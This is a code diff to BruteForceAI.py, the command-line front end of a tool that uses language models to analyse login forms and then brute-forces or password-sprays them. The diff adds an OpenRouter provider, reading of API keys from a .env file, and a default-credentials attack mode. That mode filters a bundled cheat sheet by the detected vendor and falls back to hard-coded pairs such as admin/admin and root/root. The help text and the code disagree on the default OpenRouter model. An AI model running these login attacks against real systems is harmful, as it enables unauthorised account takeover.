@@ -60,16 +60,13 @@ Examples:
   # Analyze - Analyze login forms (simplest - uses default ollama + llama3.2:3b)
   python BruteForceAI.py analyze --urls urls.txt
 
-  # Analyze - Analyze login forms (with default models)
+  # Analyze - With different LLM providers
   python BruteForceAI.py analyze --urls urls.txt --llm-provider ollama
   python BruteForceAI.py analyze --urls urls.txt --llm-provider groq --llm-api-key "your_api_key"
+  python BruteForceAI.py analyze --urls urls.txt --llm-provider openrouter  # API key from .env
 
-  # Analyze - Analyze login forms (with specific models)
-  python BruteForceAI.py analyze --urls urls.txt --llm-provider ollama --llm-model llama3.2:3b
-  python BruteForceAI.py analyze --urls urls.txt --llm-provider groq --llm-model llama-3.1-70b-versatile --llm-api-key "your_api_key"
-  
-  # Analyze - Custom Ollama server
-  python BruteForceAI.py analyze --urls urls.txt --llm-provider ollama --ollama-url http://192.168.1.100:11434
+  # Analyze - OpenRouter with specific model
+  python BruteForceAI.py analyze --urls urls.txt --llm-provider openrouter --llm-model anthropic/claude-opus-4
 
   # Attack - Brute force attack
   python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt
@@ -77,26 +74,11 @@ Examples:
   # Attack - Password spray with threads
   python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --mode passwordspray --threads 3
 
-  # Attack with Discord webhook notifications
-  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --discord-webhook "https://discord.com/api/webhooks/..."
-
-  # Attack with Telegram notifications
-  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --telegram-webhook "BOT_TOKEN" --telegram-chat-id "CHAT_ID"
-
-  # Attack with multiple webhooks
-  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --discord-webhook "..." --slack-webhook "..."
-
-  # Save output to file
-  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --output results.txt
-
   # Clean database
   python BruteForceAI.py clean-db
 
   # Check for updates
   python BruteForceAI.py check-updates
-
-  # Skip version check for faster startup
-  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --skip-version-check
         """
     )
     
@@ -111,11 +93,11 @@ Examples:
     # Analyze subcommand (formerly stage1)
     analyze_parser = subparsers.add_parser('analyze', help='Analyze login forms and identify selectors')
     analyze_parser.add_argument('--urls', required=True, help='File containing URLs (one per line)')
-    analyze_parser.add_argument('--llm-provider', choices=['ollama', 'groq'], help='LLM provider for analysis (default: ollama)')
-    analyze_parser.add_argument('--llm-model', help='LLM model name (default: llama3.2:3b for Ollama, llama-3.3-70b-versatile for Groq)')
-    analyze_parser.add_argument('--llm-api-key', help='API key for Groq (not needed for Ollama)')
+    analyze_parser.add_argument('--llm-provider', choices=['ollama', 'groq', 'openrouter'], help='LLM provider for analysis (default: ollama)')
+    analyze_parser.add_argument('--llm-model', help='LLM model name (default: llama3.2:3b for Ollama, llama-3.3-70b-versatile for Groq, anthropic/claude-opus-4.5 for OpenRouter)')
+    analyze_parser.add_argument('--llm-api-key', help='API key for Groq/OpenRouter (not needed for Ollama)')
     analyze_parser.add_argument('--ollama-url', help='Ollama server URL (default: http://localhost:11434)')
-    analyze_parser.add_argument('--selector-retry', type=int, default=10, help='Number of retry attempts for selectors')
+    analyze_parser.add_argument('--selector-retry', '--retries', type=int, default=10, help='Number of retry attempts for selectors (default: 10)')
     analyze_parser.add_argument('--show-browser', action='store_true', help='Show browser window during analysis')
     analyze_parser.add_argument('--browser-wait', type=int, default=0, help='Wait time in seconds when browser is visible')
     analyze_parser.add_argument('--proxy', help='Proxy server (e.g., http://127.0.0.1:8080)')
@@ -130,14 +112,18 @@ Examples:
     # Attack subcommand (formerly stage2)
     attack_parser = subparsers.add_parser('attack', help='Execute login attacks using analyzed selectors')
     attack_parser.add_argument('--urls', required=True, help='File containing URLs (one per line)')
-    attack_parser.add_argument('--usernames', required=True, help='File containing usernames (one per line)')
-    attack_parser.add_argument('--passwords', required=True, help='File containing passwords (one per line)')
+    attack_parser.add_argument('--usernames', help='File containing usernames (one per line)')
+    attack_parser.add_argument('--passwords', help='File containing passwords (one per line)')
+    attack_parser.add_argument('--default-creds', action='store_true',
+                              help='Use default credentials from CSV (filtered by detected vendor)')
+    attack_parser.add_argument('--default-creds-file',
+                              help='Custom default credentials CSV file (default: bundled DefaultCreds-Cheat-Sheet.csv)')
     attack_parser.add_argument('--mode', choices=['bruteforce', 'passwordspray'], default='bruteforce',
                               help='Attack mode: bruteforce (all combinations) or passwordspray (each password against all users)')
     attack_parser.add_argument('--attack', choices=['playwright'], default='playwright',
                               help='Attack method (only playwright supported)')
     attack_parser.add_argument('--threads', type=int, default=1,
-                              help='Number of threads to use for parallel attacks')
+                              help='Number of threads to use for parallel attacks (default: 1)')
     attack_parser.add_argument('--retry-attempts', type=int, default=3,
                               help='Number of retry attempts for network errors (default: 3)')
     attack_parser.add_argument('--dom-threshold', type=int, default=100,
@@ -243,24 +229,52 @@ Examples:
             print(f"🕐 Session completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
             output_capture.stop()
 
+def load_env_file():
+    """Load environment variables from .env file"""
+    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
+    env_vars = {}
+    if os.path.exists(env_path):
+        with open(env_path, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#') and '=' in line:
+                    key, value = line.split('=', 1)
+                    env_vars[key.strip()] = value.strip().strip('"').strip("'")
+    return env_vars
+
 def execute_analyze(args):
     """Execute Analyze - Login form analysis"""
     print("🚀 BruteForceAI Analyze - Login Form Analysis")
     print("=" * 50)
     print(f"URLs file: {args.urls}")
     print(f"LLM provider: {args.llm_provider or 'None'}")
-    
+
+    # Load .env file for API keys
+    env_vars = load_env_file()
+
     # Set default provider and models if not specified
     llm_provider = args.llm_provider
     llm_model = args.llm_model
-    
+    llm_api_key = args.llm_api_key
+
     # If no provider specified, default to ollama
     if not llm_provider:
         llm_provider = 'ollama'
         print(f"LLM provider: {llm_provider} (default)")
     else:
         print(f"LLM provider: {llm_provider}")
-    
+
+    # Load API key from .env if not provided via CLI
+    if not llm_api_key:
+        if llm_provider == 'openrouter':
+            llm_api_key = env_vars.get('openrouterkey') or env_vars.get('OPENROUTER_API_KEY')
+            if llm_api_key:
+                print("API key: Loaded from .env file")
+        elif llm_provider == 'groq':
+            llm_api_key = env_vars.get('GROQ_API_KEY')
+            if llm_api_key:
+                print("API key: Loaded from .env file")
+
     # Set default model based on provider if not specified
     if not llm_model:
         if llm_provider == 'ollama':
@@ -269,6 +283,9 @@ def execute_analyze(args):
         elif llm_provider == 'groq':
             llm_model = 'llama-3.3-70b-versatile'
             print(f"LLM model: {llm_model} (default for Groq)")
+        elif llm_provider == 'openrouter':
+            llm_model = 'anthropic/claude-sonnet-4'
+            print(f"LLM model: {llm_model} (default for OpenRouter)")
     else:
         print(f"LLM model: {llm_model}")
     
@@ -284,8 +301,8 @@ def execute_analyze(args):
     
     # Validate LLM setup before initializing BruteForceAI
     from BruteForceCore import _validate_llm_setup
-    _validate_llm_setup(llm_provider, llm_model, args.llm_api_key, args.ollama_url)
-    
+    _validate_llm_setup(llm_provider, llm_model, llm_api_key, args.ollama_url)
+
     # Initialize BruteForceAI
     bf = BruteForceAI(
         urls_file=args.urls,
@@ -298,7 +315,7 @@ def execute_analyze(args):
         database=args.database,
         llm_provider=llm_provider,  # Use the determined provider
         llm_model=llm_model,  # Use the determined model
-        llm_api_key=args.llm_api_key,
+        llm_api_key=llm_api_key,  # Use the determined API key (from args or .env)
         ollama_url=args.ollama_url,
         force_reanalyze=args.force_reanalyze,
         debug=args.debug,
@@ -321,6 +338,12 @@ def execute_analyze(args):
 
 def execute_attack(args):
     """Execute Attack - Login attacks"""
+    # Validate: need either default-creds or usernames+passwords
+    use_default_creds = getattr(args, 'default_creds', False)
+    if not use_default_creds and (not args.usernames or not args.passwords):
+        print("❌ Error: Either --default-creds or both --usernames and --passwords are required")
+        sys.exit(1)
+
     print("🚀 BruteForceAI Attack - Login Attacks")
     print("=" * 80)
     print(f"Mode: {args.mode}")
@@ -333,8 +356,14 @@ def execute_attack(args):
     print(f"Success exit: {args.success_exit}")
     print(f"User agents: {args.user_agents or 'Default browser'}")
     print(f"URLs file: {args.urls}")
-    print(f"Usernames file: {args.usernames}")
-    print(f"Passwords file: {args.passwords}")
+    if use_default_creds:
+        print(f"Default creds: Enabled (filtered by detected vendor)")
+        if args.default_creds_file:
+            print(f"Default creds file: {args.default_creds_file}")
+    if args.usernames:
+        print(f"Usernames file: {args.usernames}")
+    if args.passwords:
+        print(f"Passwords file: {args.passwords}")
     print(f"Database: {args.database}")
     print(f"Show browser: {args.show_browser}")
     print(f"Browser wait: {args.browser_wait}s")
@@ -360,12 +389,63 @@ def execute_attack(args):
         print(f"Webhooks: None")
     
     print("=" * 80)
-    
+
+    # Handle default credentials mode
+    usernames_file = args.usernames
+    passwords_file = args.passwords
+
+    if use_default_creds:
+        from BruteForceCore import load_default_creds, get_detected_vendor
+
+        # Load URLs to get detected vendors
+        urls = []
+        with open(args.urls, 'r') as f:
+            urls = [line.strip() for line in f if line.strip()]
+
+        # Collect all credentials for all URLs based on detected vendors
+        all_default_creds = []
+        for url in urls:
+            vendor, product = get_detected_vendor(args.database, url)
+            if vendor and vendor != 'unknown':
+                print(f"🔍 {url}: Detected vendor '{vendor}', filtering credentials...")
+                creds = load_default_creds(args.default_creds_file, vendor_filter=vendor)
+                print(f"   Found {len(creds)} matching credentials")
+                all_default_creds.extend(creds)
+            elif product and product != 'unknown':
+                print(f"🔍 {url}: Detected product '{product}', filtering credentials...")
+                creds = load_default_creds(args.default_creds_file, vendor_filter=product)
+                print(f"   Found {len(creds)} matching credentials")
+                all_default_creds.extend(creds)
+            else:
+                print(f"⚠️  {url}: No vendor detected, run 'analyze' first or using generic defaults")
+                # Use common defaults when no vendor detected
+                creds = load_default_creds(args.default_creds_file, vendor_filter=None)
+                # Limit to most common ones
+                common_creds = [('admin', 'admin'), ('admin', 'password'), ('admin', ''), ('root', 'root'), ('root', 'password'), ('user', 'user'), ('admin', '1234'), ('admin', '123456')]
+                all_default_creds.extend(common_creds)
+
+        # Remove duplicates
+        seen = set()
+        unique_creds = []
+        for cred in all_default_creds:
+            if cred not in seen:
+                seen.add(cred)
+                unique_creds.append(cred)
+
+        if unique_creds:
+            # Create temporary credential lists
+            default_usernames = list(set([c[0] for c in unique_creds]))
+            default_passwords = list(set([c[1] for c in unique_creds]))
+            print(f"📋 Total unique credentials: {len(unique_creds)} ({len(default_usernames)} usernames, {len(default_passwords)} passwords)")
+        else:
+            print("❌ No default credentials found")
+            sys.exit(1)
+
     # Initialize BruteForceAI
     bf = BruteForceAI(
         urls_file=args.urls,
-        usernames_file=args.usernames,
-        passwords_file=args.passwords,
+        usernames_file=usernames_file if not use_default_creds else default_usernames,
+        passwords_file=passwords_file if not use_default_creds else default_passwords,
         show_browser=args.show_browser,
         browser_wait=args.browser_wait,
         proxy=args.proxy,
@@ -386,14 +466,14 @@ def execute_attack(args):
         telegram_chat_id=getattr(args, 'telegram_chat_id', None),
         ollama_url=getattr(args, 'ollama_url', None)
     )
-    
+
     # Execute Stage 2
     bf.stage2(
         mode=args.mode,
         attack=args.attack,
         threads=args.threads
     )
-    
+
     print("\n✅ Attack completed!")
 
 def execute_clean_db(args):
